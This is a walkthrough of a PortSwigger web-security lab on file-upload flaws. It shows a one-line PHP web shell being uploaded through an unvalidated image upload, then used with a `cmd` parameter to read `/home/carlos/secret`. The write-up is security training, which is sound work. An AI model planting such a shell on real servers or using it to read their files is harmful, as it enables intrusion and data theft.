---
Category: File upload
LAB: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
Difficulty: Apprentice
Featured:
---
---

# Information / Description

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`


---

# Walkthrough

Cool, wo we know there is a vulnerable image upload function and to solve the lab we need to upload a basic PHP web shell and use it to get the contents of the file `/home/carlos/secret`

Let's start by identifying the vulnerable image upload function.

![](../../../0.%20Assets/Remote%20code%20execution%20via%20web%20shell%20upload-1784553561363.webp)

So when we log in we find this "settings" page where we can upload a file.

Let's craft a `PHP web shell` that takes a new parameter and lets us execute code

```
<?php system($_GET['cmd']) ?>
```

This passes the value we send to the server through the `cmd` parameter as a command to the server

And now just upload this as a file


![](../../../0.%20Assets/Remote%20code%20execution%20via%20web%20shell%20upload-1784553929638.webp)

![](../../../0.%20Assets/Remote%20code%20execution%20via%20web%20shell%20upload-1784553936505.webp)
![](../../../0.%20Assets/Remote%20code%20execution%20via%20web%20shell%20upload-1784566843582.webp)

![](../../../0.%20Assets/Remote%20code%20execution%20via%20web%20shell%20upload-1784566861358.webp)

now we can open the image (`php` script) in a new tab and call the parameter we want to request and call for the file

```
?cmd = cat /home/carlos/secret
```

![](../../../0.%20Assets/Remote%20code%20execution%20via%20web%20shell%20upload-1784566930869.webp)
![](../../../0.%20Assets/Remote%20code%20execution%20via%20web%20shell%20upload-1784566952411.webp)

```
TJ6s4dfJJRRzxd0CEDVS7WrdAfCcIXiG
```


![](../../../0.%20Assets/Remote%20code%20execution%20via%20web%20shell%20upload-1784566972900.webp)

and upload the flag